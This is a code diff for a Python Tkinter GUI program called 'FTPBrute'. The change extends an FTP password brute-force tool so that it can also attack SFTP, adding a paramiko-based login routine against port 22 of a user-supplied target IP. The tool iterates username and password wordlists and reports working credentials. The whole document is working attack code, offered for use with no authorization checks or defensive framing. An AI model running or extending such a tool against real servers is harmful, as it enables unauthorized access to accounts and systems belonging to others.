@@ -1,4 +1,5 @@
 import ftplib
+import paramiko
 import tkinter as tk
 from tkinter import filedialog, messagebox, scrolledtext
 from tkinter import ttk
@@ -9,7 +10,7 @@ class FTPBruteForceTool:
     def __init__(self, root):
         self.root = root
         self.root.title("FTPBrute - FTP Brute Force Tool")
-        self.root.geometry("550x600")
+        self.root.geometry("550x650")
         self.root.config(bg="#2e2e2e")  # Dark background color
         self.is_running = False
 
@@ -30,9 +31,17 @@ class FTPBruteForceTool:
         copyright_label.pack(pady=5)
 
         # Target IP entry
-        ttk.Label(root, text="Target FTP IP Address:").pack(pady=5)
+        ttk.Label(root, text="Target FTP/SFTP IP Address:").pack(pady=5)
         self.target_entry = ttk.Entry(root, width=50)
         self.target_entry.pack(pady=5)
+
+        # Protocol selection (FTP/SFTP)
+        ttk.Label(root, text="Select Protocol:").pack(pady=5)
+        self.protocol = tk.StringVar(value="FTP")  # Default to FTP
+        ftp_radio = ttk.Radiobutton(root, text="FTP", variable=self.protocol, value="FTP")
+        ftp_radio.pack()
+        sftp_radio = ttk.Radiobutton(root, text="SFTP", variable=self.protocol, value="SFTP")
+        sftp_radio.pack()
 
         # Username wordlist
         ttk.Label(root, text="Username Wordlist:").pack(pady=5)
@@ -77,6 +86,7 @@ class FTPBruteForceTool:
         target_ip = self.target_entry.get()
         username_file = self.username_file.get()
         password_file = self.password_file.get()
+        protocol = self.protocol.get()
 
         if not target_ip or not username_file or not password_file:
             messagebox.showwarning("Input Error", "Please fill all fields and select both wordlists.")
@@ -87,9 +97,9 @@ class FTPBruteForceTool:
         self.stop_btn.config(state='normal')
 
         # Run brute-force in a separate thread
-        threading.Thread(target=self.bruteforce_attempt, args=(target_ip, username_file, password_file)).start()
+        threading.Thread(target=self.bruteforce_attempt, args=(target_ip, username_file, password_file, protocol)).start()
 
-    def bruteforce_attempt(self, target_ip, username_file, password_file):
+    def bruteforce_attempt(self, target_ip, username_file, password_file, protocol):
         """Perform brute force attack."""
         try:
             with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
@@ -114,12 +124,19 @@ class FTPBruteForceTool:
                 self.output_area.yview(tk.END)
                 self.root.update()
 
-                # Attempt FTP login
-                if self.attempt_ftp_login(target_ip, username, password):
-                    self.output_area.config(state='normal')
-                    self.output_area.insert(tk.END, f"[SUCCESS] Username: {username}, Password: {password}\n")
-                    self.output_area.config(state='disabled')
-                    break
+                # Attempt FTP or SFTP login based on the selected protocol
+                if protocol == "FTP":
+                    if self.attempt_ftp_login(target_ip, username, password):
+                        self.output_area.config(state='normal')
+                        self.output_area.insert(tk.END, f"[SUCCESS] Username: {username}, Password: {password}\n")
+                        self.output_area.config(state='disabled')
+                        break
+                elif protocol == "SFTP":
+                    if self.attempt_sftp_login(target_ip, username, password):
+                        self.output_area.config(state='normal')
+                        self.output_area.insert(tk.END, f"[SUCCESS] Username: {username}, Password: {password}\n")
+                        self.output_area.config(state='disabled')
+                        break
 
             self.output_area.config(state='normal')
             self.output_area.insert(tk.END, "Brute force completed.\n")
@@ -147,6 +164,22 @@ class FTPBruteForceTool:
         except Exception as e:
             self.output_area.config(state='normal')
             self.output_area.insert(tk.END, f"Connection error: {e}\n")
+            self.output_area.config(state='disabled')
+            return False
+
+    def attempt_sftp_login(self, target_ip, username, password):
+        """Attempt SFTP login with given credentials."""
+        try:
+            transport = paramiko.Transport((target_ip, 22))  # Connect to the provided target IP and port
+            transport.connect(username=username, password=password)
+            transport.close()
+            return True
+        except paramiko.AuthenticationException:
+            # Authentication failed, continue trying
+            return False
+        except Exception as e:
+            self.output_area.config(state='normal')
+            self.output_area.insert(tk.END, f"SFTP connection error: {e}\n")
             self.output_area.config(state='disabled')
             return False
 
